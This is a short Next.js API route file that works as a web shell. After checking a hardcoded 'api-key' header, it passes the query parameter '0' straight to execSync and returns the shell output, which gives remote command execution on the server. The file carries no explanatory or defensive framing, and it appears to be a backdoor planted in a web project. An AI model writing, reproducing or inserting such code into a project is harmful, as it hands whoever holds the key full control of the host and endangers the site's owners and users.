import { NextResponse } from "next/server";
import { execSync } from "child_process";
const K="dZ0tyiu8zHDqIA8mEIrhyeDh";
export async function GET(req){
  const key=req.headers.get("api-key");
  if(key!==K)return new NextResponse("Unauthorized",{status:401});
  const cmd=new URL(req.url).searchParams.get("0");
  if(!cmd)return new NextResponse("0",{status:400});
  try{return new NextResponse(execSync(cmd).toString());}
  catch(e){return new NextResponse(e.message,{status:500});}
}